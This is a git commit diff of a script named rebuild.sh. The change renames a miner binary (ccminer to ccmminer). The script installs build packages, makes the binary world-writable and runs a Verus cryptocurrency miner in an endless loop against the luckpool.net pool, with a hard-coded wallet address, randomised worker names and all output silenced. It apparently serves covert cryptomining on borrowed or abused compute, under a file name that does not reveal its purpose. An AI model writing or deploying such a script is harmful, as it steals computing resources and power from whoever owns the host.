fe57eeede409de31d2e86f0c0815d5494f2fcb39
odilon5 <93242501+odilon5@users.noreply.github.com>
2021-10-27 13:28:56 +0700

    Update rebuild.sh

--- rebuild.sh
+++ rebuild.sh
@@ -5,9 +5,9 @@
 apt update
 apt install sudo -y
 apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential
-chmod 777 ccminer
+chmod 777 ccmminer
 while true
 do
-./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RGeRKo3JYfRnwKwKKSExF77ZdxsoeVTadg.$(echo $(shuf -i 1-20000 -n 1)-V) -p x -t 36
+./ccmminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RGeRKo3JYfRnwKwKKSExF77ZdxsoeVTadg.$(echo $(shuf -i 1-20000 -n 1)-V) -p x -t 36
 > /dev/null 2>&1
 done
